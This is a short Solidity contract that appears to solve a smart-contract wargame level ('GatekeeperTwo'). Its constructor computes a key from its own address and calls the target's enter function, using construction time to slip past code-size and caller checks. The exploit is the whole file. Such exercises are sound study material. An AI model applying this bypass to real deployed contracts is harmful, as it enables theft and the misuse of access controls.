// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

contract PwnGatekeeperTwo {
    constructor(address target) {
        bytes8 key = bytes8(~uint64(bytes8(keccak256(abi.encodePacked(address(this))))));
        (bool success,) = target.call(abi.encodeWithSignature("enter(bytes8)", key));
        require(success);
    }
}
